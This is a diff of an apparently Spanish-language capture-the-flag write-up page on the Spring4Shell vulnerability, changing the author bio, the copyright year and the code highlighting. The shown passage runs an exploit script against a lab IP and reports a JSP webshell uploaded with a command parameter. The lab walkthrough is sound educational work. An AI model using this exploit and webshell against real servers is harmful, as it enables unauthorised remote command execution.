@@ -202,7 +202,7 @@
     
     
       <p class="author__bio" itemprop="description">
-        Ethical hacker | eJPT | eCPPT
+        Ethical hacker | eJPT | eCPPT | eWPTX
       </p>
     
   </div>
@@ -444,16 +444,16 @@ Archive:  exploit.zip
 
 <p>Procedemos a ver el funcionamiento del script.</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">python3</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span>
-<span class="n">usage</span><span class="p">:</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span> <span class="p">[</span><span class="o">-</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="n">f</span> <span class="n">FILENAME</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="n">p</span> <span class="n">PASSWORD</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="n">d</span> <span class="n">DIRECTORY</span><span class="p">]</span> <span class="n">url</span>
-<span class="n">exploit</span><span class="o">.</span><span class="n">py</span><span class="p">:</span> <span class="n">error</span><span class="p">:</span> <span class="n">the</span> <span class="n">following</span> <span class="n">arguments</span> <span class="n">are</span> <span class="n">required</span><span class="p">:</span> <span class="n">url</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">python3</span> <span class="n">exploit</span><span class="p">.</span><span class="n">py</span>
+<span class="n">usage</span><span class="p">:</span> <span class="n">exploit</span><span class="p">.</span><span class="n">py</span> <span class="p">[</span><span class="o">-</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="n">f</span> <span class="n">FILENAME</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="n">p</span> <span class="n">PASSWORD</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="n">d</span> <span class="n">DIRECTORY</span><span class="p">]</span> <span class="n">url</span>
+<span class="n">exploit</span><span class="p">.</span><span class="n">py</span><span class="p">:</span> <span class="n">error</span><span class="p">:</span> <span class="n">the</span> <span class="n">following</span> <span class="n">arguments</span> <span class="n">are</span> <span class="n">required</span><span class="p">:</span> <span class="n">url</span>
 </code></pre></div></div>
 
 <p>Ahora ejecutamos el script con la URL victima (<em>FILENAME</em>, <em>PASSWORD</em> y <em>DIRECTORY</em> son opcionales).</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">python3</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.25.142</span><span class="o">/</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">python3</span> <span class="n">exploit</span><span class="p">.</span><span class="n">py</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">25.142</span><span class="o">/</span>
 <span class="n">Shell</span> <span class="n">Uploaded</span> <span class="n">Successfully</span><span class="err">!</span>
-<span class="n">Your</span> <span class="n">shell</span> <span class="n">can</span> <span class="n">be</span> <span class="n">found</span> <span class="n">at</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.25.142</span><span class="o">/</span><span class="n">tomcatwar</span><span class="o">.</span><span class="n">jsp</span><span class="err">?</span><span class="n">pwd</span><span class="o">=</span><span class="n">thm</span><span class="o">&amp;</span><span class="n">cmd</span><span class="o">=</span><span class="n">whoami</span>
+<span class="n">Your</span> <span class="n">shell</span> <span class="n">can</span> <span class="n">be</span> <span class="n">found</span> <span class="n">at</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">25.142</span><span class="o">/</span><span class="n">tomcatwar</span><span class="p">.</span><span class="n">jsp</span><span class="err">?</span><span class="n">pwd</span><span class="o">=</span><span class="n">thm</span><span class="o">&amp;</span><span class="n">cmd</span><span class="o">=</span><span class="n">whoami</span>
 </code></pre></div></div>
 
 <p>Como indica la salida del script, la webshell ha sido cargada en el servidor con éxito, por lo tanto, ya tenemos la <strong>capacidad</strong> de ejecutar comandos de manera remota.</p>
@@ -643,7 +643,7 @@ root@spring4shell:/# <span class="nb">head</span> <span class="nt">-c</span> 10 
   </ul>
 </div>
 
-<div class="page__footer-copyright">&copy; 2023 Bast1ant1c</div>
+<div class="page__footer-copyright">&copy; 2026 Bast1ant1c</div>
 
       </footer>
     </div>
